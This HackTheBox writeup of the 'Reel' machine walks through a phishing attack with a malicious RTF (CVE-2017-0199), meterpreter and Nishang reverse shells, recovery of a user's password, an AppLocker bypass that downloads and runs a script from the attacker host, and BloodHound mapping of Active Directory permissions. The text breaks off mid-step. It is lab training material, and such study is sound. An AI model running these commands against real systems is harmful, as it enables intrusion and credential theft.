---
title: "HackTheBox Writeup: Reel"
date: 2019-10-02T02:45:05+02:00
toc: true
showdate: true
tags:
  - hackthebox
  - ctf
  - writeup
---

This is a damn good box. Period. It starts off with the exploitation of a vulnerability via phishing that lets us execute arbitrary HTA files hidden inside RTF documents, that's our initial foothold from where things get more complicated, even a little summary of what there is to do would be too long so I'm not going to write one, just take a look at the table of contents for a minimalistic preview. One of the things I appreciated the most about this box is that it taught me a lot about how AD treats objects and how to work with them from an attacker's point of view, which is a precious lesson for Windows assestments.

![img](/images/writeup-reel/1.png)

---

## Enumeration

Let's start with the usual nmap scan to find a relatively rare SMTP port open on the box:

```aaa
┌─[baud@parrot]─[~/reel]
└──╼ $sudo nmap -sV -sC -oA nmap 10.10.10.77
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-12 01:43 CEST
Nmap scan report for 10.10.10.77
Host is up (0.024s latency).
Not shown: 992 filtered ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey:
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello:
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help:
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions:
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|_    sequence of commands
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP,
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.70%I=7%D=8/12%Time=5D50A830%P=x86_64-pc-linux-gnu%r(NULL
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20S
SF:ervice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%
SF:r(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EH
SF:LO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n"
SF:)%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20
SF:sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\
SF:r\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad
SF:\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comma
SF:nds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVer
SF:sionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusReq
SF:uestTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"2
SF:20\x20Mail\x20Service\x20ready\r\n")%r(TLSSessionReq,18,"220\x20Mail\x2
SF:0Service\x20ready\r\n")%r(Kerberos,18,"220\x20Mail\x20Service\x20ready\
SF:r\n")%r(SMBProgNeg,18,"220\x20Mail\x20Service\x20ready\r\n")%r(X11Probe
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(FourOhFourRequest,54,"220\
SF:x20Mail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n")%r(LPDString,18,"220\
SF:x20Mail\x20Service\x20ready\r\n")%r(LDAPSearchReq,18,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n")%r(LDAPBindReq,18,"220\x20Mail\x20Service\x20ready\
SF:r\n")%r(SIPOptions,162,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n503\x20Bad\x20sequence\x20of\x20commands\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m28s, deviation: 34m37s, median: -29s
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2019-08-12T00:45:51+01:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-08-12 01:45:50
|_  start_date: 2019-08-12 01:42:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.82 seconds
```

The first thing I noticed from the scan is the anonymous login allowed on FTP so I connected instantly and found three files inside the documents directory, and downloaded them all:

![img](/images/writeup-reel/2.png)

Note that because the two .docx files contain non-ASCII characters FTP will give a warning when trying to download the files using the default mode, so enable binary mode with the "image" command first or the files might be corrupted after the download. Some FTP clients switch mode automatically before downloading files.

```a
ftp> get AppLocker.docx
local: AppLocker.docx remote: AppLocker.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 9 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
2047 bytes received in 0.02 secs (85.3190 kB/s)
ftp> image
200 Type set to I.
ftp> get AppLocker.docx
local: AppLocker.docx remote: AppLocker.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2047 bytes received in 0.02 secs (84.4539 kB/s)
ftp> get readme.txt
local: readme.txt remote: readme.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
124 bytes received in 0.02 secs (5.2110 kB/s)
ftp> get "Windows Event Forwarding.docx"
local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
14581 bytes received in 0.05 secs (291.2152 kB/s)
ftp> exit
221 Goodbye.
```

The readme.txt files says someone is waiting for .rtf files and will open them for review, which is very interesting because considering there is an SMTP service running on the box this might be our target, with a phishing attack:

```a
┌─[baud@parrot]─[~/reel]
└──╼ $cat readme.txt
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

AppLocker.docx tells us AppLocker is enabled on the box to block executables and scripts:

```a
AppLocker procedure to be documented - hash rules for exe, msi and scripts  (ps1,vbs,cmd,bat,js) are in effect.
```

So we are probably going to have to bypass that. The second .docx on the other hand contains all this information:

```a
# get winrm config
winrm get winrm/config
# gpo config
O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)                      // add  to GPO
Server=http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60     // add  to GPO (60 seconds)
on source computer: gpupdate /force
# prereqs
start Windows Remote Management service on source computer
add builtin\network service account to "Event Log Readers" group on collector server
# list subscriptions / export
C:\Windows\system32>wecutil es > subs.txt
# check subscription status
C:\Windows\system32>wecutil gr "Account Currently Disabled"
Subscription: Account Currently Disabled
        RunTimeStatus: Active
        LastError: 0
        EventSources:
                LAPTOP12.HTB.LOCAL
                        RunTimeStatus: Active
                        LastError: 0
                        LastHeartbeatTime: 2017-07-11T13:27:00.920
# change pre-rendering setting in multiple subscriptions
for /F "tokens=*" %i in (subs.txt) DO wecutil ss "%i" /cf:Events
# export subscriptions to xml
for /F "tokens=*" %i in (subs.txt) DO wecutil gs "%i" /f:xml >> "%i.xml"
# import subscriptions from xml
wecutil cs "Event Log Service Shutdown.xml"
wecutil cs "Event Log was cleared.xml"
# if get error "The locale specific resource for the desired message is not present", change  subscriptions to Event format (won't do any hard running command even if they already are  in this format)
1.
for /F "tokens=*" %i in (subs.txt) DO wecutil ss "%i" /cf:Events
2.
Under Windows Regional Settings, on the Formats tab, change the format to "English (United  States)"
# check subscriptions are being created on the source computer
Event Log: /Applications and Services  Logs/Microsoft/Windows/Eventlog-ForwardingPlugin/Operational
#### troubleshooting WEF
collector server -> subscription name -> runtime status
gpupdate /force (force checkin, get subscriptions)
check Microsoft/Windows/Eventlog-ForwardingPlugin/Operational for errors
```

But the most interesting feature of this file is hidden in the metadata:

![img](/images/writeup-reel/3.png)

There's an email address, so now we can try sending .rtf files to this address and they should be opened. We have to be careful because security measures seem to have been configured, so we need to bypass AppLocker if we want access on the box. Another interesting information is the Application field, it tells us the document was created with Microsoft Office Word.

Because we know we should only send .rtf documents I searched Google for rtf-based exploits and found something very interesting: CVE-2017-0199. This vulnerability allows for the creation of malicious rtf documents that launch an HTA (HyperText Application) payload upon opening of the document, a Python toolkit to craft malicious documents that exploit this vulnerability is on [Github](https://github.com/bhdresh/CVE-2017-0199) but there also is a Metasploit module, still, I'm going to use the Python script.

---

## Exploitation attempt 1: Python script + msfvenom

First thing needed is to create an HTA payload:

```a
┌─[✗]─[baud@parrot]─[~/CVE-2017-0199]
└──╼ $msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=9999 -f hta-psh -o ../reel/payload.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of hta-psh file: 7125 bytes
Saved as: ../reel/payload.hta
```

And then generate the .rtf document:

```a
┌─[baud@parrot]─[~/CVE-2017-0199]
└──╼ $python cve-2017-0199_toolkit.py -M gen -w ../reel/document.rtf -u http://10.10.14.37:9090/payload.hta
Generating normal RTF payload.

Generated ../reel/document.rtf successfully
```

Finally the email can be sent:

```a
┌─[baud@parrot]─[~/reel]
└──╼ $sendemail -f baud@megabank.com -t nico@megabank.com -u Test -m "Hey, take a look at this new format procedure" -a document.rtf -s 10.10.10.77
Sep 02 13:21:56 parrot sendemail[2843]: Email was sent successfully!
```

The HTA payload gets downloaded as I can see from my PHP web server but the Metasploit handler just hangs, so my next try was uding Unicorn for the generation of the HTA payload instead of msfvenom.

---

## Exploitation attempt 2: Python script + Unicorn

```a
┌─[baud@parrot]─[~/reel]
└──╼ $unicorn.py windows/meterpreter/reverse_tcp 10.10.14.37 9999 hta
[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=

                
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave

Happy Magic Unicorns.
[*] Writing out index file to hta_attack/index.html
[*] Writing malicious hta launcher hta_attack/Launcher.hta

[*******************************************************************************************************]

                -----HTA ATTACK INSTRUCTIONS----

The HTA attack will automatically generate two files, the first the index.html which tells the browser to
use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
last, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener
for Metasploit. If you didn't use Metasploit, only two files will be exported.

A user must click allow and accept when using the HTA attack in order for the powershell injection to work
properly.

[*******************************************************************************************************]

    
[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.
[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.

[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.
[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.
```

But the outcome was the same.

---

## Exploitation attempt 3: Python script + Nishang

So I decided to leave Meterpreter alone for now and see if I could get it to work with Nishang since it has a script to generate HTA payloads:

```a
┌─[✗]─[baud@parrot]─[~]
└──╼ $locate nishang | grep HTA
/usr/share/nishang/Client/Out-HTA.ps1
```
PowerShell must be installed on the box in order to execute the script locally if using a Linux box but that doesn't take much to do. I'm going to let the HTA file download Nishang's .ps1 reverse shell so at the bottom of Out-HTA.ps1 I added:

```a
Out-HTA -PayloadURL http://10.10.14.37/baudy.ps1
```

And at the bottom of Invoke-PowerShellTcp.ps1:

```a
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 9999
```

We just run Out-HTA to generate the .hta file to include with the exploit:

```a
┌─[baud@parrot]─[~/reel]
└──╼ $pwsh
PowerShell 6.2.2
Copyright (c) Microsoft Corporation. All rights reserved.

https://aka.ms/pscore6-docs
Type 'help' to get help.

PS /home/baud/reel> ./Out-HTA.ps1
HTA written to /home/baud/reel\WindDef_WebInstall.hta.
PS /home/baud/reel>
```

And still nothing, the .hta file is downloaded but the .ps1 isn't.

---

## Exploitation attempt 4: Metasploit module

A little frustrated I decided to turn to the Metasploit module and it worked on the first try:

```a
msf5 > use exploit/windows/fileformat/office_word_hta
msf5 exploit(windows/fileformat/office_word_hta) > set filename document.rtf
filename => document.rtf
msf5 exploit(windows/fileformat/office_word_hta) > set srvport 9090
srvport => 9090
msf5 exploit(windows/fileformat/office_word_hta) > set srvhost 10.10.14.37
srvhost => 10.10.14.37
msf5 exploit(windows/fileformat/office_word_hta) > set lhost 10.10.14.37
lhost => 10.10.14.37
msf5 exploit(windows/fileformat/office_word_hta) > set uripath baud.hta
uripath => baud.hta
msf5 exploit(windows/fileformat/office_word_hta) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.37:4444
[+] document.rtf stored at /home/baud/.msf4/local/document.rtf
[*] Using URL: http://10.10.14.37:9090/baud.hta
[*] Server started.
msf5 exploit(windows/fileformat/office_word_hta) >
```

This starts an HTTP server hosting the .hta payload generated by Metasploit itself and also crafts the .rtf document to send the victim like before:
 
```a
┌─[baud@parrot]─[~/reel]
└──╼ $sendemail -f baud@megabank.com -t nico@megabank.com -u Test -m "Hey, let's try this again" -a /home/baud/.msf4/local/document.rtf -s 10.10.10.77
Sep 02 14:15:14 parrot sendemail[7999]: Email was sent successfully!
```

The document is opened and it successfully triggers the download and execution of the payload:

```a
msf5 exploit(windows/fileformat/office_word_hta) > [*] Sending stage (179779 bytes) to 10.10.10.77
[*] Meterpreter session 1 opened (10.10.14.37:4444 -> 10.10.10.77:57570) at 2019-09-02 14:15:27 +0200

msf5 exploit(windows/fileformat/office_word_hta) > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
[*] Sending stage (179779 bytes) to 10.10.10.77
[*] Meterpreter session 2 opened (10.10.14.37:4444 -> 10.10.10.77:57574) at 2019-09-02 14:15:50 +0200

meterpreter > getuid
Server username: HTB\nico
```

And we are in as Nico, who has the user flag in his desktop. Let's take a look at the other users on the box:

```a
c:\Users>dir
dir
Volume in drive C has no label.
Volume Serial Number is CC8A-33E1

Directory of c:\Users

04/11/2017  00:09    <DIR>          .
04/11/2017  00:09    <DIR>          ..
25/10/2017  21:48    <DIR>          .NET v2.0
25/10/2017  21:48    <DIR>          .NET v2.0 Classic
01/11/2017  22:58    <DIR>          .NET v4.5
01/11/2017  22:58    <DIR>          .NET v4.5 Classic
17/02/2018  00:29    <DIR>          Administrator
05/11/2017  00:05    <DIR>          brad
31/10/2017  00:00    <DIR>          claire
25/10/2017  21:48    <DIR>          Classic .NET AppPool
04/11/2017  00:09    <DIR>          herman
31/10/2017  23:27    <DIR>          julia
29/05/2018  23:37    <DIR>          nico
22/08/2013  16:39    <DIR>          Public
28/10/2017  22:32    <DIR>          SSHD
16/11/2017  23:35    <DIR>          tom
               0 File(s)              0 bytes
              16 Dir(s)  15,768,629,248 bytes free
```

There are quite a few of them, and it turns out most of them aren't even filler material.

---

## Horizontal privilege escalation: from Nico to Tom

Always on the desktop there is a cred.xml file that contains PowerShell credentials for Tom, the password was encrypted with SecureStrings:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

And if you're curious to see how the script that opens the attachments automaticall works it's right in the documents folder:

```batch
PS C:\Users\nico\Documents> gc open-attachments.bat
@echo off

:LOOP

echo Looking for attachments

cd C:\Users\nico\Documents\

DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i doc > C:\Users\nico\Documents\files.txt
DIR /B C:\Users\nico\Documents\Attachments\ | findstr /i rtf >> C:\Users\nico\Documents\files.txt

FOR /F "tokens=*" %%i in (files.txt) DO echo Opening attachments && MOVE /y C:\Users\nico\Documents\Attachments\%%i C:\Users\nico\Documents\Processed\%%i

FOR /F "tokens=*" %%i in (files.txt) DO START C:\Users\nico\Documents\auto-enter.ahk && ping 127.0.0.1 -n 3 > nul && START C:\Users\nico\Documents\Processed\%%i && ping 127.0.0.1 -n 20 > nul && taskkill /F /IM wordpad.exe && taskkill /F /IM AutoHotkey.exe && ping 127.0.0.1 -n 3 > nul

DEL /F C:\Users\nico\Documents\files.txt && ping 127.0.0.1 -n 3 > nul
DEL /F C:\Users\nico\Documents\Processed\*.rtf
DEL /F C:\Users\nico\Documents\Processed\*.doc
DEL /F C:\Users\nico\Documents\Processed\*.docx

cls

GOTO :LOOP

:EXIT
```

Because we know there are AppLocker policies in place from the document found earlier we should also check those:

```a
c:\Users\nico\Downloads>powershell Get-ApplockerPolicy -Effective -xml > applocker.xml
c:\Users\nico\Downloads>^C
Terminate channel 2? [y/N]  y
meterpreter > download applocker.xml
[*] Downloading: applocker.xml -> applocker.xml
[*] Downloaded 135.38 KiB of 135.38 KiB (100.0%): applocker.xml -> applocker.xml
[*] download   : applocker.xml -> applocker.xml
```

The configuration is pretty big and contains a whitelist of programs that are allowed to be executed, they can't be simply replaced with a malicious version because the hash of the executables is checked as well.

Anyway back to the credentials we can see them by creating a PSCredential object with them:

```powershell
PS C:\users\nico\desktop> $password = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | ConvertTo-SecureString
PS C:\users\nico\desktop> $creds = New-Object System.Management.Automation.PSCredential("HTB\Tom", $password)
PS C:\users\nico\desktop> $creds.GetNetworkCredential() | fl *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB

PS C:\users\nico\desktop>
```

These credentials can be used to access the system as Tom from SSH:

```a
┌─[baud@parrot]─[~/reel]
└──╼ $ssh tom@10.10.10.77
The authenticity of host '10.10.10.77 (10.10.10.77)' can't be established.
ECDSA key fingerprint is SHA256:jffiqnVqz/MrcDasdsjISFIcN/xtlDj1C76Yu1mDQVY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.77' (ECDSA) to the list of known hosts.
tom@10.10.10.77's password:

Microsoft Windows [Version 6.3.9600]                   
(c) 2013 Microsoft Corporation. All rights reserved.                                  

tom@REEL C:\Users\tom>  
```

Tom's desktop has an interesting folder called AD Audit, which then has a note:

```a
tom@REEL C:\Users\tom\Desktop\AD Audit>more note.txt                   
Findings:  

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).

Maybe we should re-run Cypher query against other groups we've created.
```

And a BloodHound folder as well, containing a bunch of scripts and executables including of course BloodHound and SharpHound, two common programs for security audits of Active Directory environments:

```a
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir               
Volume in drive C has no label.                  
Volume Serial Number is CC8A-33E1                

Directory of C:\Users\tom\Desktop\AD Audit\BloodHound                 
05/30/2018  12:44 AM    <DIR>          .                
05/30/2018  12:44 AM    <DIR>          ..   
05/29/2018  08:57 PM    <DIR>          Ingestors          
10/30/2017  11:15 PM           769,587 PowerView.ps1    
               1 File(s)        769,587 bytes          
               3 Dir(s)  15,762,337,792 bytes free    

tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>cd ingestors   

tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir    
Volume in drive C has no label.                         
Volume Serial Number is CC8A-33E1                                  

Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors    

05/29/2018  08:57 PM    <DIR>          .            
05/29/2018  08:57 PM    <DIR>          ..                    
11/17/2017  12:50 AM           112,225 acls.csv                                                                  
10/28/2017  09:50 PM             3,549 BloodHound.bin                              
10/24/2017  04:27 PM           246,489 BloodHound_Old.ps1                                        
10/24/2017  04:27 PM           568,832 SharpHound.exe                              
10/24/2017  04:27 PM           636,959 SharpHound.ps1                              
               5 File(s)      1,568,054 bytes        
               2 Dir(s)  15,762,337,792 bytes free      
```

The note says an AD security audit was performed but no path was found to escalate to domain admin from user, however newer user groups weren't tested. We could run BloodHound directly from the box because all the files are there but AppLocker is enabled and won't let us run any of the files:

```a
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> .\SharpHound.ps1     
.\SharpHound.ps1 : File C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\SharpHound.ps1 cannot be loaded because its
operation is blocked by software restriction policies, such as those created by using Group Policy.                   

At line:1 char:1                                                                                                                
+ .\SharpHound.ps1                           
+ ~~~~~~~~~~~~~~~~                      
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException                                           
    + FullyQualifiedErrorId : UnauthorizedAccess  
```

---

## Identifying attack paths with BloodHound

We can bypass the AppLocker policies by executing the SharpHound.ps1 script straight from memory by letting PowerShell download and execute a copy we are hosting locally (SharpHound is the core of BloodHound rewritten in C# and the .ps1 script has the ability of gathering all the information it finds on the host to create a database that BloodHound can read and show us what it found graphically):

```powershell
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.37/SharpHound.ps1')
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> Invoke-Bloodhound -CollectionMethod All
Initializing BloodHound at 4:37 PM on 9/2/2019
Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets
Starting Enumeration for HTB.LOCAL                    
Status: 84 objects enumerated (+84 Infinity/s --- Using 105 MB RAM )         
Finished enumeration for HTB.LOCAL in 00:00:00.5145272                    
0 hosts failed ping. 0 hosts timedout.                               

Compressing data to C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\20190902163714_BloodHound.zip.         
You can upload this file directly to the UI.       
Finished compressing files!
```

A .zip file was created with all the results of the enumeration process performed by SharpHound, we can import this archive in our local instance of BloodHound but first we must move it locally so I enabled an SMB share on my Parrot box:

```a
┌─[baud@parrot]─[~/reel]
└──╼ $sudo /usr/share/doc/python-impacket/examples/smbserver.py baud .
[sudo] password di baud:

Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then I used *net use* to enable the shared folder on Reel:

```a
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> net use \\10.10.14.37\baud
The command completed successfully.
PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> net use  
New connections will be remembered.

Status       Local     Remote                    Network                                                              
-------------------------------------------------------------------------------
Disconnected           \\10.10.14.37\baud        Microsoft Windows Network
The command completed successfully. 

PS C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors> copy 20190902163714_BloodHound.zip \\10.10.14.37\baud\bloodhound.zip
```

After starting neo4j which is the DBMS used by BloodHound to handle graph databases open BloodHound itself and import the archive with the *Import Data* button and go to *Queries* > *Shortest paths to high value target* to have an overview of important user groups and users on the system and how they can be linked to each other in possible attack paths:

![img](/images/writeup-reel/4.png)

We can use the text both on top and the "pathfinding" button to search for connections in the whole database, for example we have access to the Nico and Tom users so we can see if any of these two accounts has any possible attack paths towards one or more of the administrators groups, of which there are a few. Both Tom and Nico have at least one attack path to become Backup_Admins, as Tom can go through Claire:

![img](/images/writeup-reel/5.png)

And Nico can go through Herman:

![img](/images/writeup-reel/6.png)

Both paths are identical and take to the same place, the only difference is that at first I wasn't able to pull it off from Nico due to an error I kept getting from PowerView, but that error didn't occur from Tom as we already have a copy of PowerView.ps1 in Tom's bloodhound directory, which we can easily import to use its commands:

```a
PS C:\Users\tom\desktop\ad audit\bloodhound> dir

    Directory: C:\Users\tom\desktop\ad audit\bloodhound

Mode                LastWriteTime     Length Name                         
----                -------------     ------ ----                         
d----          9/2/2019   4:37 PM            Ingestors                    
-a---        10/30/2017  10:15 PM     769587 PowerView.ps1                

PS C:\Users\tom\desktop\ad audit\bloodhound> import-module ./powerview.ps1
```

Now we can run PowerView's commands. PowerView is a powerful collection of useful enumeration and post exploitation commands, some of which we are going to need right now.
We saw that we have WriteOwner permissions over Claire with Tom, this means we can change the user that owns an AD object, and if we change that owner to ourselves we will be able to change its properties as we wish.

Users are AD objects as well and one of the useful properties we can have access to with this power is the ability of changing user passwords.
As seen in the graph from Bloodhound, Claire has GenericWrite and WriteDacl for the Backup_Admins group, this means she can add users to that group.
We can use these two steps to escalate our privileges to administrator: first we take control of Claire's account and then we use it to add ourselves to the Backup_Admins group.

---

## Becoming Backup_Admins with PowerView: exploiting weak permissions

First we set ourselves as owners of the claire account so that we can change her properties:

```powershell
